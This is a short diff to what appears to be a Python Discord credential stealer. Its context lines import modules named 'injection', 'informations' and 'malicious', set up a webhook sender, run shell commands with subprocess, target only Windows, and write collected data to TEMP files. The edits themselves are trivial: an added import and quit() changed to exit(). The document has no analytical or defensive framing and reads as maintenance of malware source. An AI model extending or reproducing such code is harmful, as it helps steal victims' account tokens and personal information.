@@ -2,6 +2,7 @@ import discordc
 import injection
 import informations
 import malicious
+import sys
 ii = informations.Info()
 import _webhook
 _webh = _webhook.WebhookX()
@@ -43,7 +44,7 @@ except Exception:
     subprocess.run(command, shell=True)
 
 if platform.system() != "Windows":
-    quit()
+    exit()
 
 def writeforfile(data, name):
     path = os.getenv("TEMP") + f"\wp{name}.txt"
